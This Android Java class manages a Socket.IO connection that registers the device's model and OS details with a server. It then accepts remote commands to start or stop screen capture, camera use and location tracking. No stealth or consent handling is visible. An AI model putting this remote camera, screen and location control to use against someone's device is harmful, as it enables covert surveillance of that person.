package com.example.myapplication.utils;

import android.os.Build;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class SocketManager {
    private static final String TAG = "SocketManager";
    private static SocketManager instance;
    private Socket socket;
    
    // Interface for socket events callbacks
    public interface SocketEventListener {
        void onEvent(String event, JSONObject data);
        void onConnected();
        void onDisconnected();
        void onError(String error);
    }
    
    private SocketManager() {
        // Private constructor for singleton
    }
    
    public static synchronized SocketManager getInstance() {
        if (instance == null) {
            instance = new SocketManager();
        }
        return instance;
    }
    
    // Initialize socket connection
    public void initialize() {
        try {
            IO.Options options = new IO.Options();
            options.forceNew = true;
            options.reconnection = true;
            
            socket = IO.socket(Constants.SERVER_URL, options);
            
            // Setup basic event listeners
            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Socket connected");
                // Register this device with the server
                registerDevice();
            });
            
            socket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.d(TAG, "Socket disconnected");
            });
            
            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                Log.e(TAG, "Socket connection error: " + args[0]);
            });
            
            // Setup remote control listeners
            setupRemoteControlListeners();
            
            // Connect to server
            socket.connect();
            
        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket initialization error", e);
        }
    }
    
    // Register this device with the server
    private void registerDevice() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("deviceName", Build.MODEL);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            deviceInfo.put("apiLevel", Build.VERSION.SDK_INT);
            deviceInfo.put("deviceType", "Android");
            deviceInfo.put("appVersion", "1.0"); // You can make this dynamic
            
            Log.d(TAG, "Registering device: " + deviceInfo.toString());
            emit("register-device", deviceInfo);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating device registration data", e);
        }
    }
    
    // Register event listener
    public void registerEventListener(String event, SocketEventListener listener) {
        if (socket == null) {
            listener.onError("Socket not initialized");
            return;
        }
        
        socket.on(event, args -> {
            try {
                if (args.length > 0 && args[0] instanceof JSONObject) {
                    listener.onEvent(event, (JSONObject) args[0]);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error processing socket event", e);
                listener.onError("Error processing event: " + e.getMessage());
            }
        });
    }
    
    // Send data through socket
    public void emit(String event, JSONObject data) {
        if (socket != null && socket.connected()) {
            Log.d(TAG, "Emitting event: " + event + ", data size: " + (data != null ? data.toString().length() : "null"));
            socket.emit(event, data);
        } else {
            Log.e(TAG, "Socket not connected. Cannot emit event: " + event);
        }
    }
    
    // Disconnect socket
    public void disconnect() {
        if (socket != null) {
            socket.disconnect();
            socket = null;
        }
    }
    
    // Check if socket is connected
    public boolean isConnected() {
        return socket != null && socket.connected();
    }
    
    // Setup remote control event listeners
    private void setupRemoteControlListeners() {
        if (socket == null) return;
        
        // Screen capture control
        socket.on("remote-start-screen-capture", args -> {
            Log.d(TAG, "Remote command: Start screen capture");
            handleRemoteStartScreenCapture();
        });
        
        socket.on("remote-stop-screen-capture", args -> {
            Log.d(TAG, "Remote command: Stop screen capture");
            handleRemoteStopScreenCapture();
        });
        
        // Camera control
        socket.on("remote-start-camera", args -> {
            Log.d(TAG, "Remote command: Start camera");
            handleRemoteStartCamera(args);
        });
        
        socket.on("remote-stop-camera", args -> {
            Log.d(TAG, "Remote command: Stop camera");
            handleRemoteStopCamera();
        });
        
        socket.on("remote-switch-camera", args -> {
            Log.d(TAG, "Remote command: Switch camera");
            handleRemoteSwitchCamera();
        });
        
        // Location control
        socket.on("remote-start-location", args -> {
            Log.d(TAG, "Remote command: Start location");
            handleRemoteStartLocation();
        });
        
        socket.on("remote-stop-location", args -> {
            Log.d(TAG, "Remote command: Stop location");
            handleRemoteStopLocation();
        });
    }
    
    // Remote control handlers
    private void handleRemoteStartScreenCapture() {
        try {
            // Use RemoteControlManager to handle screen capture
            RemoteControlManager.getInstance().startScreenCapture();
        } catch (Exception e) {
            Log.e(TAG, "Error handling remote start screen capture", e);
        }
    }
    
    private void handleRemoteStopScreenCapture() {
        try {
            RemoteControlManager.getInstance().stopScreenCapture();
        } catch (Exception e) {
            Log.e(TAG, "Error handling remote stop screen capture", e);
        }
    }
    
    private void handleRemoteStartCamera(Object[] args) {
        try {
            String cameraType = "back"; // default
            if (args.length > 0 && args[0] instanceof JSONObject) {
                JSONObject data = (JSONObject) args[0];
                cameraType = data.optString("camera", "back");
            }
            RemoteControlManager.getInstance().startCamera(cameraType);
        } catch (Exception e) {
            Log.e(TAG, "Error handling remote start camera", e);
        }
    }
    
    private void handleRemoteStopCamera() {
        try {
            RemoteControlManager.getInstance().stopCamera();
        } catch (Exception e) {
            Log.e(TAG, "Error handling remote stop camera", e);
        }
    }
    
    private void handleRemoteSwitchCamera() {
        try {
            RemoteControlManager.getInstance().switchCamera();
        } catch (Exception e) {
            Log.e(TAG, "Error handling remote switch camera", e);
        }
    }
    
    private void handleRemoteStartLocation() {
        try {
            RemoteControlManager.getInstance().startLocation();
        } catch (Exception e) {
            Log.e(TAG, "Error handling remote start location", e);
        }
    }
    
    private void handleRemoteStopLocation() {
        try {
            RemoteControlManager.getInstance().stopLocation();
        } catch (Exception e) {
            Log.e(TAG, "Error handling remote stop location", e);
        }
    }
}
